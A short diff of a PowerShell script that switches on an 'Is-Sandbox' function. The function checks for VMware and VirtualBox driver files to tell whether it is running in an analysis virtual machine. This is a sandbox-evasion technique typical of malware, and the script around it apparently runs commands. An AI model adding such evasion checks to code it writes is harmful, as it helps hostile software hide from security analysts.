@@ -158,16 +158,15 @@ Function Execute-Command {
 }
 
 Function Is-Sandbox {
-    # Uncomment the following lines for sandbox detection
-    # Log-Message "Checking for sandbox environment..."
-    # $sandboxFiles = @("C:\WINDOWS\system32\drivers\Vmmouse.sys", "C:\WINDOWS\system32\drivers\vm3dgl.dll", "C:\WINDOWS\system32\drivers\vmhgfs.sys", "C:\WINDOWS\system32\drivers\VBoxMouse.sys")
-    # foreach ($file in $sandboxFiles) {
-    #     if (Test-Path -Path $file) {
-    #         Log-Message "Sandbox detected: $file exists"
-    #         return $true
-    #     }
-    # }
-    # Log-Message "No sandbox detected."
+    Log-Message "Checking for sandbox environment..."
+    $sandboxFiles = @("C:\WINDOWS\system32\drivers\Vmmouse.sys", "C:\WINDOWS\system32\drivers\vm3dgl.dll", "C:\WINDOWS\system32\drivers\vmhgfs.sys", "C:\WINDOWS\system32\drivers\VBoxMouse.sys")
+    foreach ($file in $sandboxFiles) {
+    if (Test-Path -Path $file) {
+             Log-Message "Sandbox detected: $file exists"
+             return $true
+         }
+     }
+     Log-Message "No sandbox detected."
     return $false
 }
 
